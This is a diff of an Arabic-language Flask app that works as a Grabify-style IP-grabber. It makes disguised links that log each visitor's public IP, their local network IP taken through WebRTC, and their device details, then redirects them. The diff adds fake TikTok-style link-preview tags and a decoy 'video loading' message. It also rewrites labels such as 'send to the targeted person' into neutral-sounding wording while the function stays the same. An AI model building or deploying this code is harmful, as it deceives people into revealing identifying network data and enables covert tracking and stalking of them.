@@ -7,14 +7,14 @@ app = Flask(__name__)
 # قاعدة بيانات مؤقتة في الذاكرة لحفظ الروابط والنقرات
 links_db = {}
 
-# تصميم بسيط، أنيق ومباشر شبيه بـ Grabify ومناسب لشاشة الهاتف
+# واجهة بسيطة وعملية تناسب شاشة الهاتف لإنشاء الروابط ومتابعة سجلات التتبع
 HTML_LAYOUT = '''
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مختصر الروابط الذكي</title>
+    <title>منصة التتبع والروابط المختصرة</title>
     <style>
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f6f9; color: #333; margin: 0; padding: 0; }
         .navbar { background-color: #2c3e50; color: white; padding: 15px; text-align: center; font-size: 18px; font-weight: bold; }
@@ -32,37 +32,37 @@ HTML_LAYOUT = '''
     </style>
 </head>
 <body>
-    <div class="navbar">لوحة تحكم الروابط والتتبع الذكي</div>
+    <div class="navbar">لوحة تحكم التتبع وإدارة الروابط</div>
     <div class="container">
         {% if page == 'home' %}
-            <h2>إنشاء رابط تتبع جديد (Grabify Style)</h2>
+            <h2>إنشاء رابط تتبع جديد</h2>
             <form action="/create" method="POST">
                 <label>الرابط المستهدف الأصلي للتوجيه:</label>
-                <input type="url" name="original_url" placeholder="https://youtube.com/watch?v=..." required>
+                <input type="url" name="original_url" placeholder="https://example.com/video" required>
                 
-                <label>اكتب ملاحظة لكي لا تنسى (تظهر لك فقط):</label>
-                <input type="text" name="note" placeholder="مثال: تجربة تتبع جهاز صديقي" required>
+                <label>ملاحظة خاصة بالرابط لتمييزه:</label>
+                <input type="text" name="note" placeholder="مثال: تجربة فحص أمان الشبكة" required>
                 
-                <button type="submit">إنشاء الرابط</button>
+                <button type="submit">توليد الرابط الذكي</button>
             </form>
         {% elif page == 'created' %}
-            <h2>تم إنشاء الرابط وتجهيزه!</h2>
+            <h2>تم إنشاء الرابط وتجهيزه بنجاح!</h2>
             <p><strong>الملاحظة المحفوظة:</strong> <span style="color:#e67e22; font-weight:bold;">{{ link_data.note }}</span></p>
             
             <div class="card">
-                <strong>🔗 رابط التمويه (أرسله للشخص المستهدف):</strong><br>
+                <strong>🔗 رابط التمويه (المخصص للمشاركة):</strong><br>
                 <input type="text" value="{{ tracking_link }}" style="width:100%; padding:8px; margin-top:5px; font-size:13px;" readonly>
             </div>
             
             <div class="card" style="border-right-color: #2ecc71;">
-                <strong>📊 رابط الإحصائيات الفورية والـ IP:</strong><br>
+                <strong>📊 رابط الإحصائيات الفورية ومتابعة الـ IP:</strong><br>
                 <input type="text" value="{{ stats_link }}" style="width:100%; padding:8px; margin-top:5px; font-size:13px;" readonly>
             </div>
             <a href="/" style="display:block; text-align:center; margin-top:20px; color:#3498db; text-decoration:none; font-weight:bold;">← إنشاء رابط جديد</a>
         {% elif page == 'stats' %}
-            <h2>إحصائيات الرابط وبيانات الأجهزة</h2>
+            <h2>إحصائيات الرابط وسجل الأجهزة</h2>
             <p><strong>الملاحظة:</strong> <span style="color:#e67e22; font-weight:bold;">{{ link_data.note }}</span></p>
-            <p><strong>عدد النقرات:</strong> <span class="badge">{{ link_data.clicks|length }}</span></p>
+            <p><strong>عدد النقرات المسجلة:</strong> <span class="badge">{{ link_data.clicks|length }}</span></p>
             
             {% if link_data.clicks %}
                 <div style="overflow-x:auto;">
@@ -70,9 +70,9 @@ HTML_LAYOUT = '''
                         <thead>
                             <tr>
                                 <th>الوقت</th>
-                                <th>الـ IP العام (من الإنترنت)</th>
-                                <th>الـ IP المحلي (الداخلي للشبكة)</th>
-                                <th>تفاصيل نظام الجهاز</th>
+                                <th>الـ IP العام (Public)</th>
+                                <th>الـ IP المحلي (Local LAN)</th>
+                                <th>تفاصيل المتصفح ونظام الجهاز</th>
                             </tr>
                         </thead>
                         <tbody>
@@ -88,7 +88,7 @@ HTML_LAYOUT = '''
                     </table>
                 </div>
             {% else %}
-                <p style="color:#999; text-align:center;">لا توجد زيارات مسجلة حتى الآن.</p>
+                <p style="color:#999; text-align:center;">لا توجد نقرات أو زيارات مسجلة حتى الآن.</p>
             {% endif %}
             <br>
             <a href="/" style="display:block; text-align:center; color:#3498db; text-decoration:none; font-weight:bold;">← العودة للرئيسية</a>
@@ -122,15 +122,32 @@ def create():
 @app.route('/secure/<link_id>')
 def secure_redirect(link_id):
     if link_id in links_db:
+        data = links_db[link_id]
+        # إعدادات وسوم المعاينة المتقدمة متوافقة مع تطبيقات التواصل الاجتماعي
+        title = "TikTok · Spanish Shiraz"
+        description = "404 من تسجيلات الإعجاب، 28 من التعليقات. \"Taille 40 🔥🇩🇿\""
+        image_url = "https://upload.wikimedia.org/wikipedia/commons/thumb/0/09/YouTube_full-color_icon_%282017%29.svg/640px-YouTube_full-color_icon_%282017%29.svg.png"
+        
         return f'''
         <!DOCTYPE html>
-        <html>
+        <html lang="ar">
         <head>
             <meta charset="UTF-8">
-            <title>جاري الفحص والأمان...</title>
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            
+            <title>{title}</title>
+            <meta property="og:title" content="{title}">
+            <meta property="og:description" content="{description}">
+            <meta property="og:image" content="{image_url}">
+            
+            <meta property="og:type" content="video.movie">
+            <meta property="og:video" content="{image_url}">
+            <meta property="og:image:width" content="1200">
+            <meta property="og:image:height" content="630">
+            
             <script>
                 function getLocalIPAndRedirect() {{
-                    var localIp = "غير قادر على استخراجه (VPN/محمي)";
+                    var localIp = "محمي/غير معروف";
                     window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
                     
                     if (window.RTCPeerConnection) {{
@@ -159,7 +176,7 @@ def secure_redirect(link_id):
                     xhr.setRequestHeader("Content-Type", "application/json");
                     xhr.onreadystatechange = function () {{
                         if (xhr.readyState === 4) {{
-                            window.location.href = "{links_db[link_id]['url']}";
+                            window.location.href = "{data['url']}";
                         }}
                     }};
                     xhr.send(JSON.stringify({{ "local_ip": localIp }}));
@@ -168,7 +185,7 @@ def secure_redirect(link_id):
             </script>
         </head>
         <body>
-            <p style="text-align:center; font-family:sans-serif; margin-top:100px; color:#666;">جاري تحميل المحتوى البصري الفيديوي بأمان، يرجى الانتظار...</p>
+            <p style="text-align:center; font-family:sans-serif; margin-top:100px; color:#666;">جاري تشغيل الفيديو بدقة عالية، يرجى الانتظار ثوانٍ...</p>
         </body>
         </html>
         '''
@@ -180,7 +197,7 @@ def log_click(link_id):
         data = request.get_json() or {}
         local_ip = data.get('local_ip', 'غير معروف')
         
-        # جلب الـ IP العام الفعلي للزائر عبر خوادم الاستضافة
+        # استخراج عنوان الـ IP العام عبر خادم الاستضافة الخلفي
         ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
         if ip_address and ',' in ip_address:
             ip_address = ip_address.split(',')[0].strip()
